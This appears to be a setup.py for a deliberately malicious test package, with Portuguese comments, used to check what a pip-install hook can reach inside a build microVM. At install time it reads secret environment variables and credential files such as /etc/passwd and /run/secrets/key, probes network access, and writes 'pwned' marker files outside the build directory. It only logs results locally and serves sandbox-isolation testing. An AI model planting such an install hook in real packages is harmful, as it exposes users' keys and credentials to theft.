from setuptools import setup
import os, socket, json, pathlib

# Este código executa durante `pip install`, simulando um ataque de supply chain.
# O objetivo é documentar o que um pacote malicioso consegue acessar
# de dentro da microVM de build da CVM2.

log = {}

# 1. Tentar ler variáveis de ambiente (chaves, tokens, credenciais)
sensitive_vars = ["ASSET_ENCRYPTION_KEY", "PRIVATE_KEY", "AWS_SECRET_ACCESS_KEY",
                  "HOME", "USER", "PATH"]
log["env"] = {k: os.environ.get(k, "[not found]") for k in sensitive_vars}
log["all_env_keys"] = list(os.environ.keys())

# 2. Tentar ler arquivos sensíveis do host
files_to_probe = ["/etc/passwd", "/etc/hostname", "/proc/version",
                  "/proc/self/cgroup", "/run/secrets/key"]
log["file_reads"] = {}
for f in files_to_probe:
    try:
        log["file_reads"][f] = open(f).read(200)
    except Exception as e:
        log["file_reads"][f] = f"[blocked: {e}]"

# 3. Tentar conexão de rede de dentro do build
log["network"] = {}
for host, port in [("8.8.8.8", 80), ("1.1.1.1", 53)]:
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((host, port))
        s.close()
        log["network"][f"{host}:{port}"] = "REACHABLE"
    except Exception as e:
        log["network"][f"{host}:{port}"] = f"BLOCKED: {e}"

# 4. Tentar gravar fora do diretório de build
log["write_escape"] = {}
for path in ["/tmp/malicious_marker.txt", "/var/dnat/pwned.txt", "/root/pwned.txt"]:
    try:
        pathlib.Path(path).write_text("pwned by malicious_pkg during pip install")
        log["write_escape"][path] = "WRITTEN"
    except Exception as e:
        log["write_escape"][path] = f"BLOCKED: {e}"

# Salvar resultado no disco de output caso exista, senão em /tmp
output = json.dumps(log, indent=2)
print("[T2-MALICIOUS-PKG] install-time payload executed")
print("[T2-MALICIOUS-PKG] results:", output)

for dest in ["/output/t2_malicious_install.json", "/tmp/t2_malicious_install.json"]:
    try:
        pathlib.Path(dest).write_text(output)
        print(f"[T2-MALICIOUS-PKG] log written to {dest}")
        break
    except Exception:
        pass

setup(
    name="malicious-pkg",
    version="1.0.0",
    description="Simulated supply chain attack package for DNAT security evaluation",
    packages=["malicious_pkg"],
)
